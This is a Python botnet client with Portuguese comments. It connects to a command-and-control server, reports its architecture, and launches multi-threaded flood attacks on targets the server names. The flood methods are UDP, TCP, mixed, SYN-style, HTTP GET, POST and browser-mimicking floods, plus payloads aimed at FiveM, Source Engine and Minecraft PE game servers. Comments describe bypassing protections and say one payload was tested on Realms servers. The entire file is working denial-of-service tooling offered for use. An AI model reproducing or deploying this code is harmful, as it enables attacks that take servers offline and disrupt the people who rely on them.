import subprocess, random, random, os, time, threading, socket

# Configuration
C2_ADDRESS  = ""
C2_PORT     = 1337


# Payload para FiveM (servidores de GTA V)
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
# Payload para VSE (servidores diversos)
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
# Payload para MCPE (Minecraft PE)
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
# Payload HEXadecimal
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'


PACKET_SIZES = [1024, 2048]


base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
]
def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except Exception as e:
        print(f"\nErro ao obter arquitetura: {e}\n")
        return 'unknown'

def attack_fivem(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_fivem, (ip, port))


def attack_mcpe(ip, port, secs):
    """Testado em Realms Servers"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_mcpe, (ip, port))


def attack_vse(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_vse, (ip, port))


def attack_hex(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        s.sendto(payload_hex, (ip, port))


def attack_udp_bypass(ip, port, secs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES) 
        packet = random._urandom(packet_size)
        sock.sendto(packet, (ip, port))



def attack_tcp_bypass(ip, port, secs):
    """Tenta contornar proteção adicionando pacotes com tamanhos diferentes."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while time.time() < secs:
        packet_size = random.choice(PACKET_SIZES) 
        packet = random._urandom(packet_size)

        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(packet)
        except Exception as e:
            pass
        finally:
            s.close()


def attack_tcp_udp_bypass(ip, port, secs):
    """Tenta contornar proteção variando protocolo e adicionando pacotes com tamanhos diferentes."""
    while time.time() < secs:
        try:
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)
            
            if random.choice([True, False]):  # Alterna entre TCP e UDP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
            while time.time() < secs:
                if s.type == socket.SOCK_STREAM:
                    s.send(packet)
                else:
                    s.sendto(packet, (ip, port))
        except Exception as e:
            pass
        finally:
            s.close()


def attack_syn(ip, port, secs):
    """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    
    try:
        s.connect((ip, port))
        while time.time() < secs:
            packet_size = random.choice(PACKET_SIZES)
            packet = os.urandom(packet_size)
    
            s.send(packet)
    except Exception as e:
        pass


def attack_http_get(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < secs:
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            s.close()


def attack_http_post(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while time.time() < secs:
        try:
            s.connect((ip, port))
            while time.time() < secs:
                payload = '757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
                headers = (f'POST / HTTP/1.1\r\n'
                           f'Host: {ip}\r\n'
                           f'User-Agent: {rand_ua()}\r\n'
                           f'Content-Type: application/x-www-form-urlencoded\r\n'
                           f'Content-Length: {len(payload)}\r\n'
                           f'Connection: keep-alive\r\n\r\n'
                           f'{payload}')
                s.send(headers.encode())
        except:
            s.close()


def attack_browser(ip, port, secs):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    while time.time() < secs:
        try:
            s.connect((ip, port))
            request = (f'GET / HTTP/1.1\r\n'
                       f'Host: {ip}\r\n'
                       f'User-Agent: {rand_ua()}\r\n'
                       f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
                       f'Accept-Encoding: gzip, deflate, br\r\n'
                       f'Accept-Language: en-US,en;q=0.5\r\n'
                       f'Connection: keep-alive\r\n'
                       f'Upgrade-Insecure-Requests: 1\r\n'
                       f'Cache-Control: max-age=0\r\n'
                       f'Pragma: no-cache\r\n\r\n')
            
            s.sendall(request.encode())
            
        except Exception as e:
            pass
        finally:
            s.close()


def lunch_attack(method, ip, port, secs):
    methods = {
        '.HEX': attack_hex,
        '.UDP': attack_udp_bypass,
        '.TCP': attack_tcp_bypass,
        '.MIX': attack_tcp_udp_bypass,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
        '.BROWSER': attack_browser,
    }
    methods[method](ip, port, secs)

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send(get_architecture().encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            
            print('connected!')
            break
        except:
            time.sleep(120)

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].upper()

            if command == 'PING':
                c2.send('PONG'.encode())
            else:
                method = command
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                print(threads)

                for _ in range(threads):
                    threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
